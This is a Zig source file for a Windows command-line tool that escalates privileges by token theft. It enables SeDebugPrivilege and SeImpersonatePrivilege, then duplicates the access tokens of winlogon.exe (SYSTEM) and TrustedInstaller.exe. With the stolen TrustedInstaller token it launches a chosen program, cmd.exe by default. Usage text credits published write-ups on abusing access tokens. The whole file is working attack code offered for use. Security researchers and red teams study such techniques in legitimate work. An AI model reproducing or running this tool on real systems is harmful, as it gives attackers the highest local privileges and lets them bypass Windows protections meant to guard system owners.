// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const std = @import("std");
const win32 = @import("win32").everything;
const win32_security = @import("win32").security;

const windows = std.os.windows;

// https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170

// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
extern "advapi32" fn OpenProcessToken(
    ProcessHandle: ?win32.HANDLE,
    DesiredAccess: win32_security.TOKEN_ACCESS_MASK,
    TokenHandle: ?*?win32.HANDLE,
) callconv(windows.WINAPI) win32.BOOL;

// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
pub extern "advapi32" fn DuplicateTokenEx(
    hExistingToken: ?win32.HANDLE,
    DesiredAccess: u32,
    lpTokenAttributes: ?*win32.SECURITY_ATTRIBUTES,
    ImpersonationLevel: win32.SECURITY_IMPERSONATION_LEVEL,
    TokenType: win32.TOKEN_TYPE,
    phNewToken: ?*?win32.HANDLE,
) callconv(windows.WINAPI) win32.BOOL;

const Action = struct {
    const Self = @This();

    command: []u8,
    targetPID: u32,
    tiPID: u32,
    sPID: u32,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .command = "",
            .targetPID = 0,
            .tiPID = 0,
            .sPID = 0,
            .allocator = allocator,
        };
    }

    pub fn GetPIDToken(pid: u32) ?win32.HANDLE {
        var sourceProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
        var hProcess: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        hProcess = win32.OpenProcess(
            win32.PROCESS_QUERY_LIMITED_INFORMATION,
            windows.TRUE,
            pid,
        );
        defer _ = Action.CloseHandle(hProcess);
        const result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ pid, result });
            return win32.INVALID_HANDLE_VALUE;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == OpenProcessToken(
            hProcess.?,
            win32_security.TOKEN_ALL_ACCESS,
            &sourceProcessToken,
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return win32.INVALID_HANDLE_VALUE;
        }

        return sourceProcessToken;
    }

    pub fn DuplicatePIDToken(pid: u32) ?win32.HANDLE {
        const sourceProcessToken: ?win32.HANDLE = GetPIDToken(pid);
        var duplicateProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;

        defer _ = Action.CloseHandle(sourceProcessToken);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        if (0 == win32.ImpersonateLoggedOnUser(
            sourceProcessToken.?,
        )) {
            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return win32.INVALID_HANDLE_VALUE;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
        if (0 == DuplicateTokenEx(
            sourceProcessToken.?,
            win32.MAXIMUM_ALLOWED,
            null,
            win32.SecurityImpersonation,
            win32.TokenPrimary,
            &duplicateProcessToken,
        )) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return win32.INVALID_HANDLE_VALUE;
        }

        const result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{result});
            return win32.INVALID_HANDLE_VALUE;
        }

        return duplicateProcessToken;
    }

    pub fn AttemptModifyPrivilege(allocator: std.mem.Allocator, privilege: []const u8, processToken: ?win32.HANDLE) bool {
        var tp: win32.TOKEN_PRIVILEGES = std.mem.zeroes(win32.TOKEN_PRIVILEGES);
        var result: u32 = 0;

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;
        var success: bool = true;

        const lpName = std.fmt.allocPrintSentinel(allocator, "{s}", .{privilege}, 0) catch return false;
        std.log.debug("[+] Attempting to enable {s}\n", .{lpName});

        defer allocator.free(lpName);

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        if (0 == win32.LookupPrivilegeValueA(
            @ptrFromInt(0),
            lpName,
            &tp.Privileges[0].Luid,
        )) {
            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            success = false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        if (0 == win32.AdjustTokenPrivileges(
            processToken.?,
            0,
            &tp,
            @sizeOf(win32.TOKEN_PRIVILEGES),
            @ptrFromInt(0),
            @ptrFromInt(0),
        )) {
            result = @intFromEnum(win32.GetLastError());
            if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
                std.log.err("[!] Failed AdjustTokenPrivileges {s} - invalid handle :: error code ({d})", .{ privilege, result });
                success = false;
            } else {
                std.log.err("[!] Failed AdjustTokenPrivileges {s} :: error code ({d})", .{ privilege, result });
            }
        }

        result = @intFromEnum(win32.GetLastError());
        if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS
            success = false;
            if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
                std.log.err("[!] Failed to modify privilege {s} :: error code ({d})", .{ privilege, result });
            } else {
                std.log.err("[-] Failed to modify {s} :: error code ({d})", .{ privilege, result });
            }
        } else {
            std.log.info("[+] Modified {s}", .{privilege});
        }

        return success;
    }

    pub fn execute(self: *Self) bool {
        if (self.targetPID == 0 or self.tiPID == 0 or self.sPID == 0) {
            self.findPIDs();
        }

        if (self.targetPID == 0) {
            std.log.err("[!] Failed to locate parent process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        if (self.tiPID == 0) { // TODO: kick service and go again?
            std.log.err("[!] Failed to locate TrustedInstaller.exe process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        if (self.sPID == 0) {
            std.log.err("[!] Failed to locate winlogon.exe process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        std.log.debug("[+] Using System PID: {d}", .{self.sPID});
        std.log.debug("[+] Using TI PID: {d}", .{self.tiPID});
        std.log.debug("[+] Target PID: {d}", .{self.targetPID});

        const targetProcessToken: ?win32.HANDLE = GetPIDToken(self.targetPID);
        defer _ = Action.CloseHandle(targetProcessToken);

        if (targetProcessToken.? == win32.INVALID_HANDLE_VALUE) {
            std.log.err("[!] Failed to aquire process token for target process Id {d} :: error code :: ({d})", .{ self.targetPID, @intFromEnum(win32.GetLastError()) });
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
        if (!Action.AttemptModifyPrivilege(self.allocator, win32.SE_DEBUG_NAME, targetProcessToken)) {
            std.log.err("[!] User does not possess SeDebugPrivilege", .{});
            return false;
        }

        if (!Action.AttemptModifyPrivilege(self.allocator, win32.SE_IMPERSONATE_NAME, targetProcessToken)) {
            std.log.err("[!] User does not possess SeImpersonateNamePrivilege", .{});
            return false;
        }

        std.log.info("[+] Privileges Enabled", .{});

        const systemProcessToken: ?win32.HANDLE = DuplicatePIDToken(self.sPID);
        defer _ = Action.CloseHandle(systemProcessToken);
        var result = @intFromEnum(win32.GetLastError());

        if (systemProcessToken.? == win32.INVALID_HANDLE_VALUE) {
            std.log.err("[-] Failed to duplicate system PID ({d}) token :: error code ({d})", .{ self.tiPID, result });
            return false;
        }

        std.log.info("[+] Gained System", .{});

        var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);

        startupInfo.cb = @sizeOf(win32.STARTUPINFOW);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const processHandle: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_QUERY_LIMITED_INFORMATION,
            windows.TRUE,
            self.tiPID,
        );
        defer _ = Action.CloseHandle(processHandle);

        if (result != 0) {
            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ self.tiPID, result });
            return false;
        }

        const trustedInstallerProcessToken: ?win32.HANDLE = DuplicatePIDToken(self.tiPID);
        defer Action.CloseHandle(trustedInstallerProcessToken);

        if (trustedInstallerProcessToken.? == win32.INVALID_HANDLE_VALUE) {
            std.log.err("[-] Failed to duplicate TrustedInstaller PID ({d}) token :: error code ({d})", .{ self.tiPID, result });
            return false;
        }

        std.log.info("[+] Gained Trusted Installer", .{});

        const lpApplicationName = std.unicode.utf8ToUtf16LeAllocZ(self.allocator, self.command) catch undefined;
        errdefer self.allocator.free(lpApplicationName);

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
        if (0 == win32.CreateProcessWithTokenW(
            trustedInstallerProcessToken.?,
            win32.LOGON_WITH_PROFILE,
            lpApplicationName,
            null,
            0,
            null,
            null,
            &startupInfo,
            &processInformation,
        )) {
            std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
            return false;
        }

        result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed CreateProcessWithTokenW :: error code ({d})", .{result});
            return false;
        }

        return true;
    }

    pub fn findPIDs(self: *Self) void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid
        const pid: u32 = win32.GetCurrentProcessId();

        //https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
        const handle = win32.CreateToolhelp32Snapshot(
            win32.TH32CS_SNAPPROCESS,
            0,
        );

        if (handle == win32.INVALID_HANDLE_VALUE) {
            return;
        }

        defer Action.CloseHandle(handle);

        var pe32: win32.PROCESSENTRY32 = std.mem.zeroes(win32.PROCESSENTRY32);
        pe32.dwSize = @sizeOf(win32.PROCESSENTRY32);

        // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
        if (windows.FALSE == win32.Process32First(
            handle,
            &pe32,
        )) {
            return;
        }

        if (self.targetPID == 0 and pe32.th32ProcessID == pid) {
            self.targetPID = pe32.th32ParentProcessID;
        }

        if (self.tiPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "TrustedInstaller.exe")) {
            self.tiPID = pe32.th32ProcessID;
        }

        if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
            self.sPID = pe32.th32ProcessID;
        }

        if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
            return;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
        while (windows.TRUE == win32.Process32Next(
            handle,
            &pe32,
        )) {
            if (self.targetPID == 0 and pe32.th32ProcessID == pid) {
                self.targetPID = pe32.th32ParentProcessID;
            }

            if (self.tiPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "TrustedInstaller.exe")) {
                self.tiPID = pe32.th32ProcessID;
            }

            if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
                self.sPID = pe32.th32ProcessID;
            }

            if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
                break;
            }
        }
    }

    pub fn debug(self: *Self) void {
        std.log.debug(
            "\nSystem PID:\t{d}\nTI PID:\t{d}\nTarget PID:\t{d}\nCommand:\t{s}\n",
            .{ self.sPID, self.tiPID, self.targetPID, self.command },
        );
    }

    pub fn parsePID(self: *Self, line: []u8) !void {
        self.targetPID = std.fmt.parseInt(u32, line, 10) catch undefined;
    }

    pub fn parseTIPID(self: *Self, line: []u8) !void {
        self.tiPID = std.fmt.parseInt(u32, line, 10) catch undefined;
    }

    pub fn parseCommand(self: *Self, line: []u8) !void {
        self.command = std.fmt.allocPrint(self.allocator, "{s}", .{line}) catch undefined;
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.command);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
        _ = win32.RevertToSelf();
    }

    pub fn CloseHandle(handle: ?win32.HANDLE) void {
        if (handle != null and handle.? != win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            _ = win32.CloseHandle(handle.?);
        }
    }
};

pub fn usage(argv: []u8) !void {
    const stdout = std.io.getStdOut().writer();

    try stdout.print(
        \\  This tool exist thanks to: 
        \\    * https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
        \\    * https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
        \\
        \\Requirements:
        \\  * SE_IMPERSONATE_NAME - "The process that calls CreateProcessWithTokenW must have this privilege."
        \\  * SE_DEBUG_PRIVILEGE
        \\
        \\Usage:
        \\   <PID> <TI PID> <lpApplicationName>
        \\
        \\Example:
        \\
        \\ .\\{s} <target PID> <TI PID> C:\windows\system32\cmd.exe
        \\
        \\ Spawn as TI using the current terminal PID as the <target PID>, iterate processes and attempt to locate the <TI PID>
        \\ .\\{s} 0 0 C:\windows\system32\cmd.exe
        \\
        \\ Exactly as above - shorthand.
        \\ .\\{s} 0 0
    , .{ argv, argv, argv });

    std.posix.exit(0);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 3) {
        try usage(args[0]);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parsePID(arg);
        }

        if (i == 2) {
            try action.parseTIPID(arg);
        }

        if (i == 3) {
            try action.parseCommand(arg);
        }

        i += 1;
    }

    if (action.command.len <= 0) {
        action.command = std.fmt.allocPrint(action.allocator, "{s}", .{"C:\\windows\\system32\\cmd.exe"}) catch undefined;
    }

    const file = std.fs.openFileAbsolute(action.command, .{}) catch {
        std.log.err("[!] Failed to open {s}\n", .{action.command});
        return;
    };
    file.close();

    action.debug();

    if (!action.execute()) {
        std.log.err("[!] Failed to execute {s}", .{action.command});
        return;
    }

    std.log.info("[+] Executed {s}", .{action.command});

    std.posix.exit(0);
}
